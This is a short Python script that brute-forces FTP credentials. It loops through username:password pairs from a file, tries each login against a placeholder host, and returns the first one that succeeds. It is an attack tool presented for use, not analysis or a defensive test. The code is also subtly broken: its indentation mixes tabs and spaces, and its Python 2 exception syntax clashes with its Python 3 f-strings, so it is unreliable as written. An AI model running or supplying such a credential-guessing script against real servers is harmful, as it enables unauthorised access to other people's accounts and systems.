import ftplib, time

def bruteLogin(hostname, passwd_file):
    pf = open(passwd_file, 'r+')
    for line in pf.readlines():
	time.sleep(1)
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
	print(f'[+] Trying: {username}/{password}')
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print(f'\n[*] {hostname} FTP Logon Succeeded: {username}/{password}')
            ftp.quit()
            return (username, password)
        except Exception, e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)

host = '{ADD HOST IP}'
passwd_file = 'userpass.txt'
bruteLogin(host, passwd_file)
